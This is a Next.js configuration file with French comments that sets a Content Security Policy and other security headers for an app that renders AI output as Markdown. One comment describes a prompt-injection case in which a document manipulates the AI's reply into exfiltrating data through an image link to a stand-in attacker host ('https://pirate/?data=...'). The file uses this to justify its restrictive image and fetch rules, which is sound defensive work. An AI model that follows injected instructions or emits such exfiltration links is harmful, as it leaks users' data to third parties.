import type { NextConfig } from "next";

const isDev = process.env.NODE_ENV === "development";

// Supabase est appelé depuis le navigateur (connexion, envoi des fichiers vers le stockage)
const supabaseOrigin = (() => {
  try {
    return new URL(process.env.NEXT_PUBLIC_SUPABASE_URL ?? "").origin;
  } catch {
    return "";
  }
})();
const supabaseWs = supabaseOrigin.replace(/^http/, "ws");

// Déploiement en HTTPS ? (pas NODE_ENV : `next start` en local tourne en production mais en http,
// avec Supabase en http://127.0.0.1:54321 ; forcer https y casserait les appels à Supabase).
// Déduit de l'adresse publique du site si elle est connue, sinon de celle de Supabase.
// CLARITY_HTTPS=1 / 0 force la décision.
const isHttps = (() => {
  const forced = process.env.CLARITY_HTTPS;
  if (forced === "1" || forced === "true") return true;
  if (forced === "0" || forced === "false") return false;
  const site = process.env.NEXT_PUBLIC_SITE_URL ?? (process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : "");
  const reference = site || process.env.NEXT_PUBLIC_SUPABASE_URL || "";
  return !isDev && reference.startsWith("https://");
})();

// Politique de sécurité du contenu (CSP), version « pragmatique » sans nonce :
// - Cache Components / prérendu partiel (PPR) sont incompatibles avec une CSP à nonce (la coquille statique
//   ne peut pas connaître le nonce de la requête), et Next.js insère des scripts en ligne (__next_f) :
//   script-src garde donc 'unsafe-inline'. La vraie défense contre le XSS reste le rendu Markdown sans HTML brut
//   (react-markdown sans rehype-raw, KaTeX sans « trust »).
// - style-src 'unsafe-inline' : KaTeX et React posent des attributs style.
// - img-src limité au site : une réponse de l'IA manipulée par un document (injection de consignes) ne peut pas
//   exfiltrer de données via une image ![](https://pirate/?data=...) ; idem connect-src pour fetch.
// - frame-ancestors 'none' : pas d'intégration dans un autre site (clickjacking).
const csp = [
  "default-src 'self'",
  `script-src 'self' 'unsafe-inline'${isDev ? " 'unsafe-eval'" : ""}`,
  "style-src 'self' 'unsafe-inline'",
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  "media-src 'self' blob: data:",
  `connect-src 'self'${supabaseOrigin ? ` ${supabaseOrigin} ${supabaseWs}` : ""}${isDev ? " ws: wss:" : ""}`,
  "worker-src 'self' blob:",
  "frame-src 'none'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "manifest-src 'self'",
  ...(isHttps ? ["upgrade-insecure-requests"] : []),
].join("; ");

const securityHeaders = [
  { key: "Content-Security-Policy", value: csp },
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "X-Frame-Options", value: "DENY" },
  // Les liens de partage contiennent leur jeton dans l'adresse : jamais transmis en entier à un autre site
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  {
    key: "Permissions-Policy",
    value: "camera=(self), microphone=(), geolocation=(), payment=(), usb=(), serial=(), bluetooth=(), browsing-topics=()",
  },
  { key: "Cross-Origin-Opener-Policy", value: "same-origin-allow-popups" },
  { key: "X-DNS-Prefetch-Control", value: "off" },
  // HTTPS obligatoire, seulement pour un vrai déploiement en https (voir isHttps)
  ...(isHttps ? [{ key: "Strict-Transport-Security", value: "max-age=63072000; includeSubDomains" }] : []),
];

const nextConfig: NextConfig = {
  /* config options here */
  cacheComponents: true,
  partialPrefetching: true,
  poweredByHeader: false,
  turbopack: {
    rules: {
      "*.css": {
        loaders: ["@tailwindcss/turbopack"],
        as: "*.css",
      },
    },
  },
  async headers() {
    return [
      { source: "/:path*", headers: securityHeaders },
      // Réponses de l'API : pas d'indexation (le cache est réglé par chaque route : les émotes se gardent en cache)
      { source: "/api/:path*", headers: [{ key: "X-Robots-Tag", value: "noindex" }] },
      // Pages partagées : pas d'indexation par les moteurs de recherche, pas de référent
      {
        source: "/share/:path*",
        headers: [
          { key: "X-Robots-Tag", value: "noindex, nofollow" },
          { key: "Referrer-Policy", value: "no-referrer" },
        ],
      },
    ];
  },
};

export default nextConfig;
